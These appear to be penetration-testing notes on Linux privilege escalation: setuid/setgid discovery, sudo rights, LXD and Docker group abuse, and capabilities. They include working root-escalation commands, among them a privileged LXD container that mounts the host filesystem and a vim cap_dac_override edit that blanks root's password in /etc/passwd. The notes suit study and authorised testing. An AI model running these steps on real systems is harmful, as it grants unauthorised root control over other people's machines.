-  [Special Permissions](#special-permissions)
-  [Sudo Rights Abuse](#sudo-rights-abuse)
-  [Privileged Groups](#privileged-groups)
-  [Capabilities](#capabilities)
---
### Special Permissions
- [setuid & setgid](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
- It's possible to reverse engineer the program with the special bit set, identify a vulnerability, and exploit this to escalate our privileges.
	``` bash
	# Find binaries with setuid set
	find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
	# Find binaries with setgid set
	find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
	```
---
### Sudo Rights Abuse
- Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.
``` bash
sudo -l
```
---
### Privileged Groups
- LXC & [LXD](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)
	- LXD is similar to Docker and is Ubuntu's container manager.
	- By default, all users are added to the LXD group.
	- Members of this group can escalate privileges by creating an LXD container, make it privileged, then access the host file system at `/mnt/root`.
	``` bash
	# Unzip the Alpine image.
	unzip alpine.zip
	
	# Start the LXD initialization process.
	# https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04
	lxd init
	
	# Import the local image.
	lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
	
	# Start a privileged container
	lxc init alpine r00t -c security.privileged=true
	
	# Mount the host file system.
	lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
	
	# Spawn a shell inside the container instance.
	lxc start r00t
	lxc exec r00t /bin/sh
	```
- Docker
	- Create a new Docker instance with the /root directory on the host file system mounted as a volume.
		``` bash
		docker run -v /root:/mnt -it ubuntu
		```
- Disk
	- Disk group have full access to any devices contained within `/dev`, such as `/dev/sda1` (the main device used by the system).
	- An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.
- adm
	- Members of the adm group are able to read all logs stored in `/var/log`.
	- Does not directly grant root access, but leveraged to enumerate user actions, sensitive data in log files and running cron jobs.
---
### Capabilities
Capabilities are a security feature that allows specific privileges to be granted to processes.

| **Capability**         | **Description**                                                                      |
| ---------------------- | ------------------------------------------------------------------------------------ |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges.                            |
| `cap_setuid`           | Allows a process to set its effective user ID.                                       |
| `cap_setgid`           | Allows to set its effective group ID.                                                |
| `cap_dac_override`     | Allows bypassing of file read, write, and execute permission checks.                 |
| `cap_sys_chroot`       | Allows to change the root directory for the current process.                         |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes.                                       |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes.                                  |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps. |
| `cap_sys_resource`     | Allows to modify system resource limits.                                             |
| `cap_sys_module`       | Allows to load and unload kernel modules.                                            |
| `cap_net_bind_service` | Allows to bind to network ports.                                                     |

| Value | Privileges Granted                     | Inheritance | Usage Example                                        |
| ----- | -------------------------------------- | ----------- | ---------------------------------------------------- |
| `=`   | Clears or explicitly sets capabilities | None        | `setcap = /path/to/executable`                       |
| `+ep` | Effective and Permitted                | No          | `setcap cap_net_bind_service+ep /path/to/executable` |
| `+ei` | Effective and Inheritable              | Yes         | `setcap cap_net_bind_service+ei /path/to/executable` |
| `+p`  | Permitted only                         | No          | `setcap cap_net_bind_service+p /path/to/executable`  |
- Set and View Capabilities
	``` bash
	# To set a capability
	sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
	# To see the capability on the executable
	getcap /usr/bin/vim.basic
	```
- Enumerating and Exploiting Capabilities
	``` bash
	$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
	/usr/bin/vim.basic cap_dac_override=eip
	
	$ cat /etc/passwd | head -n1
	root:x:0:0:root:/root:/bin/bash
	
	# Use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
	/usr/bin/vim.basic /etc/passwd
	# We also can make these changes in a non-interactive mode:
	$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
	
	$ cat /etc/passwd | head -n1
	root::0:0:root:/root:/bin/bash
	# Without the {x}, use the command su to log in as root without being asked for the password.
	```
---
